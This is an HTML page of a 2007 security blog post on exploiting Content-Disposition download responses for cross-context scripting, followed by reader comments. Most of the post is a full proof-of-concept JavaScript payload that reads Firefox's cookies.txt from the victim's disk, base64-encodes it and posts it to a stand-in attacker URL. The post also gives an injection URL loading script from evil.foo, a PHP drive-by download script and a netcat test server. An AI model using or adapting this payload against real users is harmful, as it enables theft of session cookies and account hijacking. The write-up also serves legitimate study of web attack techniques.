@@ -1,0 +1,228 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Content-Disposition Hacking</title><meta name="description" content="In a recent pentest, a colleague of mine pointed out to me a script/html injection vulnerability on one of the hosts we were testing. I then copied and pasted the GET request he forwarded to me on telnet and verified that JavaScript could indeed be injected through the non-sanitized parameter. There were no restrictions on the input length or types of characters. No filtering whatsoever. The attack goes as the following:"><meta property="name" content="Content-Disposition Hacking"><meta itemprop="name" content="Content-Disposition Hacking"><meta property="description" content="In a recent pentest, a colleague of mine pointed out to me a script/html injection vulnerability on one of the hosts we were testing. I then copied and pasted the GET request he forwarded to me on telnet and verified that JavaScript could indeed be injected through the non-sanitized parameter. There were no restrictions on the input length or types of characters. No filtering whatsoever. The attack goes as the following:"><meta itemprop="description" content="In a recent pentest, a colleague of mine pointed out to me a script/html injection vulnerability on one of the hosts we were testing. I then copied and pasted the GET request he forwarded to me on telnet and verified that JavaScript could indeed be injected through the non-sanitized parameter. There were no restrictions on the input length or types of characters. No filtering whatsoever. The attack goes as the following:"><meta property="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fcontent-disposition-hacking%2F?w=1024"><meta itemprop="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fcontent-disposition-hacking%2F?w=1024"><meta property="og:type" content="website"><meta property="og:url" content="https://www.gnucitizen.org/blog/content-disposition-hacking/"><meta property="og:title" content="Content-Disposition Hacking"><meta property="og:description" content="In a recent pentest, a colleague of mine pointed out to me a script/html injection vulnerability on one of the hosts we were testing. I then copied and pasted the GET request he forwarded to me on telnet and verified that JavaScript could indeed be injected through the non-sanitized parameter. There were no restrictions on the input length or types of characters. No filtering whatsoever. The attack goes as the following:"><meta property="og:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fcontent-disposition-hacking%2F?w=1024"><meta name="twitter:title" content="Content-Disposition Hacking"><meta name="twitter:description" content="In a recent pentest, a colleague of mine pointed out to me a script/html injection vulnerability on one of the hosts we were testing. I then copied and pasted the GET request he forwarded to me on telnet and verified that JavaScript could indeed be injected through the non-sanitized parameter. There were no restrictions on the input length or types of characters. No filtering whatsoever. The attack goes as the following:"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fcontent-disposition-hacking%2F?w=1024"><link type="text/css" href="/blog.css" rel="stylesheet"><script type="text/javascript" src="/blog.js"></script></head><body><header id="header"><h1><a href="/"></a></h1><p></p></header><nav id="topnav"><ul><li><a href="/">Home</a></li><li><a href="/projects.html">Projects</a></li><li><a href="/files">Files</a></li><li><a href="/about.html">About</a></li></ul></nav><article><div id="content"><h1 class="title">Content-Disposition Hacking</h1><div>Mon, 05 Nov 2007 12:44:31 GMT</div><div id="post-content"><p>In a recent pentest, a colleague of mine pointed out to me a script/html injection vulnerability on one of the hosts we were testing. I then copied and pasted the GET request he forwarded to me on telnet and verified that JavaScript could indeed be injected through the non-sanitized parameter. There were no restrictions on the input length or types of characters. No filtering whatsoever. The attack goes as the following:</p>
+<pre><code>GET /cgi-bin/vulnerable.cgi?param=&lt;script&gt;alert(document.location)&lt;/script&gt; HTTP/1.1
+Host: www.target.foo
+Connection: close
+
+HTTP/1.1 200 OK
+Server: Apache
+**Content-Disposition: attachment; filename=button.html**
+Content-Length: 41
+Content-Type: application/octet-stream
+
+&lt;script&gt;alert(document.location)&lt;/script&gt;
+
+This was very interesting. When I pasted the test URL (_http://www.target.foo/cgi-bin/vulnerable.cgi?param=&lt;script&gt;alert(document.location)&lt;/script&gt;_) in my browser, I thought &quot;OK, this is pretty useless, as the browser doesn&#39;t render the HTML/JS, but rather prompts me to either open or download the file `button.html`&quot;. The file to download would contain the payload supplied to the `param` parameter. Eventually, I realize that this happens due to the server returning a [Content-Disposition](http://support.microsoft.com/kb/260519)/attachment HTTP header (see Server&#39;s response above).
+
+Perhaps `vulnerable.cgi` was a legacy script that used to be used for dynamically generating the HTML of a menu button. For some reason the server appeared to be misconfigured and would return a `Content-Disposition` header when generating `button.html`. Whatever the case is, I then realized that this html injection bug wasn&#39;t as useless as I had thought, but could eventually lead to a _Cross-context Scripting_ attack. _The requirement is that the victim is tricked to open the file once the browser&#39;s download dialog appears (the kind of a drive-by-download attack would use)_. For those of you who don&#39;t know, the idea of a _Cross-context Scripting_ is to break from the domain-based sandbox to gain local-context privileges (a.k.a. local zone), so that your malicious script can gain access to any data in the local system. Let&#39;s proceed to the attack:
+
+http://victim.foo/cgi-bin/vulnerable.cgi?param=%3cscript%20src=http://evil.foo/evil.js%3e
+
+You might be better off including the whole payload directly, as opposed to including it from a third-party site through script src. I&#39;m saying this because IE 7 won&#39;t allow you to call JavaScript from a third-party website when opening a HTML file locally. So to come around this, simply insert all the JavaScript in the HTML body directly. I prepared a PoC which is based on a payload I [wrote](/blog/web-pages-from-hell-2/) a year ago. The idea is that if the user is tricked to visit the attack URL, and then clicks on `Open as`, Firefox&#39;s cookies file - which contains the session IDs of ALL visited domains gets stolen. Not very nice, isn&#39;t it?
+
+// evil.js - Adrian Pastor (pagvac) - GNUCITIZEN.org
+document.write(&quot;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;form method=&quot;POST&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;stolenfile&quot;&gt;&lt;/form&gt;&quot;);
+// This code was written by Tyler Akins and has been placed in the
+// public domain.  It would be nice if you left this header intact.
+// Base64 code from Tyler Akins -- http://rumkin.com
+
+var keyStr = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;;
+
+function encode64(input) {
+   var output = &quot;&quot;;
+   var chr1, chr2, chr3;
+   var enc1, enc2, enc3, enc4;
+   var i = 0;
+
+   do {
+      chr1 = input.charCodeAt(i++);
+      chr2 = input.charCodeAt(i++);
+      chr3 = input.charCodeAt(i++);
+
+      enc1 = chr1 &gt;&gt; 2;
+      enc2 = ((chr1 &amp; 3) &lt;&lt; 4) | (chr2 &gt;&gt; 4);
+      enc3 = ((chr2 &amp; 15) &lt;&lt; 2) | (chr3 &gt;&gt; 6);
+      enc4 = chr3 &amp; 63;
+
+      if (isNaN(chr2)) {
+         enc3 = enc4 = 64;
+      } else if (isNaN(chr3)) {
+         enc4 = 64;
+      }
+
+      output = output + keyStr.charAt(enc1) + keyStr.charAt(enc2) +
+         keyStr.charAt(enc3) + keyStr.charAt(enc4);
+   } while (i &lt; input.length);
+
+   return output;
+}
+// end of Base64 code from Tyler Akins -- http://rumkin.com
+
+// VARIABLE DECLARATIONS
+var attackersURL = &quot;http://evil.foo/xt.php&quot;; // replace URL value with your own!  for example http://ikwt.com/xt.php
+// interesting Mozilla Firefox files include cookies.txt, signons.txt, key3.db, bookmarks.bak
+var j=0, found=0;
+var strProfileContent, strFirefoxProfileLocation, strPayloadLocation, strProfileName, strHomeFolder;
+var file2steal, strFile2StealContent, strTmp;
+
+//alert(navigator.appName);
+
+// if IE
+if(navigator.appName==&quot;Microsoft Internet Explorer&quot;)
+{
+        var req = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
+        var reqB = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
+}
+
+else
+{
+        var req = new XMLHttpRequest();
+        var reqB = new XMLHttpRequest();
+}
+
+strPayloadLocation=String(document.location);
+document.write(&quot;strPayloadLocation: &quot; + strPayloadLocation + &quot;&lt;br&gt;&quot;);
+
+// alert(strPayloadLocation.length);
+
+if(!document.domain)
+        document.write(&quot;&lt;br&gt;Running script on local context!!!&lt;br&gt;&lt;br&gt;&quot;);
+else
+{
+        alert(&quot;This file must be run locally (i.e.: Windows desktop)!&quot;);
+        exit;
+}
+
+// get Windows home folder
+for(j=0; j&lt;strPayloadLocation.length; j++)
+{
+                                //document.write(strPayloadLocation.charAt(j) + &quot; &quot;);
+                                if(strPayloadLocation.charAt(j)==&quot;/&quot;)
+                                {
+                                        ++found;
+
+                                        // in order to obtain Windows user home folder we get up to 6th slash
+                                        // from document.location. i.e.: file:///C:/Documents%20and%20Settings/p0wn3dUser/
+                                        if(found==6)
+                                        {
+                                                strHomeFolder = strPayloadLocation.substring(0, j+1);
+                                                document.write(&quot;strHomeFolder: &quot; + strHomeFolder + &quot;&lt;br&gt;&quot;);
+                                                break;
+                                        }
+
+                                }
+}
+
+strFirefoxProfileLocation=strHomeFolder+&quot;Application Data/Mozilla/Firefox/profiles.ini&quot;;
+
+if(!strHomeFolder)
+{
+        alert(&quot;This HTML file must be launched anywhere within your home folder!\ni.e.:\nC:\\Documents and Settings\\myusername\\\nC:\\Documents and Settings\\myusername\\My Documents\\\nC:\\Documents and Settings\\myusername\\Desktop\\&quot;);
+        exit;
+}
+
+document.write(&quot;strFirefoxProfileLocation: &quot; + strFirefoxProfileLocation + &quot;&lt;br&gt;&quot;);
+
+// get contents of strFirefoxProfileLocation
+try
+{
+                //document.write(strFirefoxProfileLocation+&quot;&lt;br&gt;&quot;);
+                req.open(&quot;GET&quot;, strFirefoxProfileLocation, null);
+                req.send(null);
+                //alert(file2steal);
+                if(req.responseText)
+                {
+                        strProfileContent=req.responseText;
+                        document.write(&quot;profileContent:&lt;br&gt;&lt;br&gt;&quot; + strProfileContent + &quot;&lt;br&gt;&lt;br&gt;&quot;);
+
+                        strProfileName=strProfileContent.substring(strProfileContent.indexOf(&quot;/&quot;)+1, strProfileContent.length);
+                        strTmp=strProfileName;
+                        //alert(strProfileName);
+                        //alert(strProfileName.indexOf(&quot;\n&quot;));
+                        //strProfileName=strTmp.substring(0, strProfileName.indexOf(&quot;\n&quot;)-1);
+                        strProfileName=strProfileName.substring(0, strProfileName.indexOf(&quot;\n&quot;)-1);
+                        //strProfileName.indexOf(&quot;\ &quot;)
+                        document.write(&quot;StrProfileName: &quot; + strProfileName + &quot;&lt;br&gt;&quot;);
+                        //document.write(strProfileContent.indexOf(&quot;/&quot;)+&quot;&lt;br&gt;&quot;);
+                }
+
+} catch (e) {};
+
+file2steal = strHomeFolder + &quot;Application Data/Mozilla/Firefox/Profiles/&quot; + strProfileName + &quot;/cookies.txt&quot;;
+document.write(&quot;file2steal: &quot;+ file2steal+&quot;&lt;br&gt;&lt;br&gt;&quot;);
+
+// get contents of file2steal
+try
+{
+                reqB.open(&quot;GET&quot;, file2steal, null);
+                reqB.send(null);
+
+                if(reqB.responseText)
+                {
+                        strFile2StealContent=reqB.responseText;
+                        document.write(&quot;strFile2StealContent:&lt;br&gt;&lt;br&gt;&quot; + reqB.responseText + &quot;&lt;br&gt;&lt;br&gt;&quot;);
+                        strFile2StealContent=encode64(reqB.responseText);
+                }
+
+} catch (e) {};
+
+document.forms[0].action=attackersURL;
+//alert(document.forms[0].action);
+document.forms[0].stolenfile.value=strFile2StealContent;
+//alert(document.forms[0].stolenfile.value);
+
+// confirm box only added for ethical reason. In a real-world scenario an attacker wouldnt even bother asking you
+// for permission before stealing a file from your filesystem!
+if(confirm(&quot;pagvac says:\n\Do you really want to submit your \&quot;cookies.txt\&quot; file to &quot;+attackersURL+&quot;\n???&quot;))
+        document.forms[0].submit();
+else
+        exit;
+
+document.write(&quot;&lt;/body&gt;&lt;/html&gt;&quot;);
+
+The beauty of this attack is that that the bad guy can exploit the trust the victim has on the `victim.foo` domain, since the download dialog is initiated from such domain. This case study was to me another reminder that, what sometimes appears to be a useless vulnerability, can be turned into something more useful by using a bit of imagination.
+
+Needless to say, if you visit a site controlled by the attacker, the same effect can be accomplished by simply configuring the server to return a `Content-Disposition` header. This is one of the many ways to perform [drive-by download attacks](/blog/hacking-without-0days-drive-by-java/). The following is a PHP script that would allow you to perform a `content-disposition` drive-by download that would run JavaScript with local privilege - assuming that the victim is tricked to open the `bad.html` file:
+
+&lt;?
+
+header(&quot;Content-Disposition: attachment; filename=bad.html&quot;);
+header(&quot;Content-Type: text/html&quot;);
+readfile(&quot;http://www.gnucitizen.org/blog/web-pages-from-hell-2/theft_of_Win_FF_cookies.html&quot;);
+
+?&gt;
+
+If you want to experiment with `Content-Disposition` headers, you can simply run a netcat server on the go. All you need is a script such as the following:
+
+#!/bin/bash
+# run-server.sh
+
+while true
+do
+       cat response | nc -v -l -p55555
+       # connect to localhost:55555 using your favorite browser
+       sleep 2
+done
+
+Content of response file:
+
+HTTP/1.1 200 OK
+Server: test
+content-disposition: attachment; filename=test.html
+Content-length: 16
+Content-Type: application/octet-stream
+
+whatever content</code></pre><p><em>Have fun and let me know if you find something interesting!</em></p>
+</div><div id="post-comments"><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Awesome AnDrEw"><span>Awesome AnDrEw</span><div class="post-comment-content">This is a lot similar to many forum services that offer user-uploadable attachments, and then use the "Content-Disposition" header to have them appear in a prompt as displayed. I've never come across a situation other than something along those lines though I did do some experimenting with files served in that manner, and figured that as the file executes in a local zone (the internet cache) if one could convince someone else to open the file as long as it did not contain any off-site files it should render on Internet Explorer without the ActiveX warning appearing.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Alice"><span>Alice</span><div class="post-comment-content">It's weird, I was attempting to do this exact same thing only yesterday, and now I see your article.
+
+Very good work- it'll come in handy.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Gafoa"><span>Gafoa</span><div class="post-comment-content">people at gnu are just smart I plan on looking for a few bugs etc... My self now</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="eXeCuTe"><span>eXeCuTe</span><div class="post-comment-content">Alice, it's even more weird. i also tried that, yesterday, and now i see this.. strange :)
+
+anyway, this is a really cool idea... but i do get the ActiveX warning on IE, even if i don't use any off-site files, why is that?
+with FF it works great..</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Adrian Pastor"><span>Adrian Pastor</span><div class="post-comment-content">@eXeCuTe - IE 7 displays a warning when opening files locall - which is great in my opinion. Even opening a .html file with a empty JS snippet causes the warning to show: 
+
+<pre><code>&lt;script&gt;//TEST&lt;/script&gt;</code></pre>
+
+On Firefox however, no warning is shown, which scares me as you can steal any files by using XHR()
+
+Anyway, if you can cause manipulate the content-disposition reponse on a site, you can exploit the trust the victim has on that brand/company.
+
+@Alice and @eXeCuTe - what you guys are telling is creeping the heck out of me! I guess we all are in similar frequencies!</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Adrian Pastor"><span>Adrian Pastor</span><div class="post-comment-content">btw, I meant to say *locally*.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Anant Shrivastava"><span>Anant Shrivastava</span><div class="post-comment-content">Awesome was just looking for something simmilar. Altohugh i know i am atleast 5 years late. however what about POST request do you see a flaw in that too. as GET i can understand the requesting url trust is what we can voilate.</div></div></div></div></article><footer id="footer"><p>Copyright &copy; 2019 <a href=""></a>. All rights reserved.</p></footer></body></html>
